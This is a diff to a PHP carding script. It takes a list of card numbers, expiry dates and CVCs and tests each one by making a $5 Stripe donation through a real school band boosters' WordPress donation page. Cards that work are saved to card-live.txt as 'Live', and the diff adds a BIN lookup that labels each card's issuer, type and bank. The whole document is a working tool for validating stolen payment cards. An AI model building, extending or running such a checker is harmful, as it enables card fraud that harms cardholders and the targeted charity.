@@ -1,5 +1,5 @@
  <?php
-  echo "List Mailist  : ";
+  echo "List Creditcard  : ";
 $xyz = trim(fgets(STDIN));
 $jml = count(explode("\n", str_replace("\r", "", file_get_contents($xyz))));
 echo "\n";
@@ -10,6 +10,14 @@ foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key =
   $year = trim($pecah[2]);
   $cvc = trim($pecah[3]);
 
+  $rest = substr("'.$card.'", 2, -12);
+  $bin = curl('https://binlist.io/lookup/'.$rest.'/', null, null);
+  $json = json_decode($bin[1], true);
+  $type = $json['type'];
+  $iin = $json['number']['iin'];
+  $scheme = $json['scheme'];
+  $cate = $json['category'];
+  $country = $json['bank']['name'];
 
   $pktoken = curl('https://www.milfordbands.org/support-us/donations/', null, null);
   $token = get_between($pktoken[1], '{"p_key":"', '"');
@@ -42,10 +50,10 @@ foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key =
 
   $pktoken = curl('https://www.milfordbands.org/wp-admin/admin-ajax.php', 'action=ds_process_button&stripeToken='.$idtoken.'&paymentMethodID='.$token2.'&allData%5BbillingDetails%5D%5Bemail%5D=pulswer%40gmail.com&type=donation&amount=5&params%5Bname%5D=Milford+Bands&params%5Bamount%5D=&params%5Boriginal_amount%5D=5&params%5Bdescription%5D=Milford+Bands+Donation+Page&params%5Bpanellabel%5D=Donate+to+Us!&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=true&params%5Bcapture%5D=true&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=&params%5Bcustom_role%5D=&params%5Bbilling%5D=false&params%5Bshipping%5D=false&params%5Brememberme%5D=false&params%5Bkey%5D='.$token.'&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.milfordbands.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fmilfordbands.org%2Fwp-content%2Fuploads%2F2018%2F12%2FMilfordBandFB-1-2.jpg&params%5Bgeneral_currency%5D=USD&params%5Bgeneral_billing%5D=&params%5Bgeneral_shipping%5D=&params%5Bgeneral_rememberme%5D=&params%5Binstance%5D=ds5eab4b33d035e&params%5Bds_nonce%5D=7d485c3e5a&ds_nonce=7d485c3e5a', $headers1);
    if (strpos($pktoken[1], 'On behalf of the Milford Band Boosters and our students, thank you so much for your generous contribution to our band and extracurricular band booster programs at Milford Exempted Village School District.')) {
-    echo "[Live] $card|$month|$year|$cvc\n";
+    echo "[Live] $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country\n";
     fwrite(fopen("card-live.txt", "a"), "[Live] | $card|$month|$year|$cvc \n");
   } if (strpos($pktoken[1], 'Your card was declined.')) {
-    echo "[Die] $card|$month|$year|$cvc\n";
+    echo "[Die] $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country\n";
   }
 }
 
